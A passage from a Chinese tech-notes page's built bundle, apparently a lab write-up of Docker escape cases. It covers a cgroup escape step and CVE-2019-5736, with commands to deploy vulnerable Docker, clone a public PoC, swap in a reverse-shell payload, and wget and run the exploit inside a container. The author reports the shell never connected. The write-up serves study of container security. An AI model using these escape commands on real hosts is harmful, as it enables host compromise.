<span class="line"><span>sh -c &quot;echo \\$\\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+U+'" alt="image-20231008151609076"></p><h2 id="runc逃逸-cve-2019-5736" tabindex="-1"><a class="header-anchor" href="#runc逃逸-cve-2019-5736"><span><strong>runC逃逸-CVE-2019-5736</strong></span></a></h2><p>cve-2019-5736属于docker环境逃逸类型漏洞，该漏洞利用runC文件被覆盖，当管理员通过exec进入容器的时候，触发payload，从而达到逃逸 。个人理解这种方式利用的条件其实比较苛刻，主要苛刻在宿主机中必须有管理员使用exec进入当前docker环境，如果宿主机没有在运行EXP后进入该容器的话，是无法进行逃逸的。</p><h3 id="影响版本" tabindex="-1"><a class="header-anchor" href="#影响版本"><span><strong>影响版本</strong></span></a></h3><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>docker version &lt;=18.09.2 RunC version &lt;=1.0-rc6</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="环境搭建-4" tabindex="-1"><a class="header-anchor" href="#环境搭建-4"><span><strong>环境搭建</strong></span></a></h3><p>在部署该环境时，需要先将之前系统上所安装的docker卸载掉安装18.06版本的docker，我这里直接恢复了还没安装docker时的快照，故直接安装即可。</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh &amp;&amp; bash install.sh</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="'+Y+`" alt="image-20231008151619854"></p><p>另外可以使用 Metarget去直接部署环境，操作命令如下： 安装Metarget</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>git clone https://github.com/brant-ruan/metarget.git</span></span>
<span class="line"><span>cd metarget/</span></span>
<span class="line"><span>pip3 install -r requirements.txt</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+Z+'" alt="image-20231008151628250"></p><p>部署cve-2019-5736</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>./metarget cnv install cve-2019-5736</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="'+$+'" alt="image-20231008151637425"></p><p>如上，已成功搭建好符合版本的docker环境，接下来我们启动一个docker容器即可</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>docker run -it ubuntu:18.04</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="'+J+'" alt="image-20231008151648920"></p><h3 id="漏洞利用-5" tabindex="-1"><a class="header-anchor" href="#漏洞利用-5"><span><strong>漏洞利用</strong></span></a></h3><p>下载EXP</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>git clone https://github.com/Frichetten/CVE-2019-5736-PoC</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="'+R+'" alt="image-20231008151657142"></p><p>修改payload为反弹shell</p><p><img src="'+W+'" alt="image-20231008151704945"></p><p>修改完之后进行编译，</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="'+Q+'" alt="image-20231008151713095"></p><p>编译后会生成一个main的可执行文件，这里我们需要将其放到docker容器中，在kali中启动一个http服务，在容器中使用wget的命令去下载该文件</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>python3 -m http.server 8080</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="'+ee+`" alt="image-20231008151721117"></p><p>在docker容器中下载该exp，并赋予执行权限，执行</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>wget http://192.168.198.128:8080/main</span></span>
<span class="line"><span>chmod u+x main</span></span>
<span class="line"><span>./main</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+se+`" alt="image-20231008151732401"></p><p>然后这里我们假装为宿主机管理员，现在进入到该容器中</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>docker ps</span></span>
<span class="line"><span>docker exec -it 3056c91f69ea</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+ae+'" alt="image-20231008151740181"></p><p>这时再来看我们的docker容器里执行的exp已然被执行</p><p><img src="'+ie+'" alt="img"></p><p>但是奇怪的是并没有反弹过来shell，其他命令也无法被执行，修改了n次paylaod也无果，希望有成功的大佬能告知小弟步骤哪里错了。 至此，Docker逃逸漏洞案例章节完结，撒花~~</p><p>参考链接： <a href="https://link.zhihu.com/?target=https%3A//blog.csdn.net/qq_69775412/article/details/124265678" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/qq_69775412/article/details/124265678</a><a href="https://link.zhihu.com/?target=https%3A//cloud.tencent.com/developer/article/1987725" target="_blank" rel="noopener noreferrer">https://cloud.tencent.com/developer/article/1987725</a><a href="https://link.zhihu.com/?target=https%3A//copyfuture.com/blogs-details/202206262308472625" target="_blank" rel="noopener noreferrer">https://copyfuture.com/blogs-details/202206262308472625</a><a href="https://link.zhihu.com/?target=https%3A//www.freebuf.com/vuls/264843.html" target="_blank" rel="noopener noreferrer">https://www.freebuf.com/vuls/264843.html</a><a href="https://link.zhihu.com/?target=https%3A//segmentfault.com/a/1190000040980305" target="_blank" rel="noopener noreferrer">https://segmentfault.com/a/1190000040980305</a></p>',186)]))}const ce=s(te,[["render",ne]]),pe=JSON.parse('{"path":"/note-book/Docker/Docker%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B.html","title":"Docker逃逸漏洞案例","lang":"zh-CN","frontmatter":{"description":"Docker逃逸漏洞案例 https://zhuanlan.zhihu.com/p/588513910 什么是Docker Docker是一个开源的引擎,可以轻松的为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署,包括VMs(虚拟机)、bare metal、OpenStack 集群和其他...","head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Docker逃逸漏洞案例\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2025-04-11T02:13:31.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Paper-Dragon\\",\\"url\\":\\"https://github.com/Paper-Dragon\\",\\"email\\":\\"2678885646@qq.com\\"}]}"],["meta",{"property":"og:url","content":"https://www.geekery.cn/note-book/Docker/Docker%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B.html"}],["meta",{"property":"og:site_name","content":"运维开发绿皮书"}],["meta",{"property":"og:title","content":"Docker逃逸漏洞案例"}],["meta",{"property":"og:description","content":"Docker逃逸漏洞案例 https://zhuanlan.zhihu.com/p/588513910 什么是Docker Docker是一个开源的引擎,可以轻松的为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署,包括VMs(虚拟机)、bare metal、OpenStack 集群和其他..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-04-11T02:13:31.000Z"}],["meta",{"property":"article:modified_time","content":"2025-04-11T02:13:31.000Z"}]]},"git":{"createdTime":1696749576000,"updatedTime":1744337611000,"contributors":[{"name":"PaperDragon-SH","username":"PaperDragon-SH","email":"2678885646@qq.com","commits":4,"url":"https://github.com/PaperDragon-SH"},{"name":"Paper-Dragon","username":"Paper-Dragon","email":"2678885646@qq.com","commits":1,"url":"https://github.com/Paper-Dragon"}],"changelog":[{"hash":"4f5d306b7085d639c6ebe401af5124eac0f820e0","time":1744337611000,"email":"2678885646@qq.com","author":"Paper-Dragon","message":"Firefox密码提取"},{"hash":"f7f2a09c84ecf3e02274fd7699c5c95c0fcf1863","time":1711088152000,"email":"2678885646@qq.com","author":"PaperDragon-SH","message":"Docker的Markdown规范化"},{"hash":"59f93f47613439a10abfb7060f7de655983c7fb9","time":1706147919000,"email":"2678885646@qq.com","author":"PaperDragon-SH","message":"fixed url encode conflict with wordcloud error"},{"hash":"510f60db14448c81a48bb31a81e5a2eea741c2bc","time":1700560048000,"email":"2678885646@qq.com","author":"PaperDragon-SH","message":"bash利用扩展字符集实现rm"},{"hash":"3f8607e95e8d9ea0c875d764866dada562e7ec9f","time":1696749576000,"email":"2678885646@qq.com","author":"PaperDragon-SH","message":"Docker逃逸那些事儿"}]},"readingTime":{"minutes":14.35,"words":4305},"filePathRelative":"note-book/Docker/Docker逃逸漏洞案例.md","localizedDate":"2023年10月8日","excerpt":"\\n<blockquote>\\n<p><a href=\\"https://zhuanlan.zhihu.com/p/588513910\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">https://zhuanlan.zhihu.com/p/588513910</a></p>\\n</blockquote>\\n<h2><strong>什么是Docker</strong></h2>\\n<p>Docker是一个开源的引擎,可以轻松的为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署,包括VMs(虚拟机)、bare metal、OpenStack 集群和其他的基础应用平台。</p>","autoDesc":true}');export{ce as comp,pe as data};
